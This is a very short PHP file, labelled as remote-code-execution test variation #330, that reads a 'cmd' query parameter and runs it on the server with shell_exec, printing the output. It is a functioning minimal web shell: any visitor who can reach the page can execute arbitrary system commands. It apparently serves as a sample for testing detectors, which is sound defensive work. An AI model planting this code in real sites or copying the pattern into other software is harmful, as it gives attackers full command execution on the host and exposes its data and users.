<?php
// RCE test variation #330
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>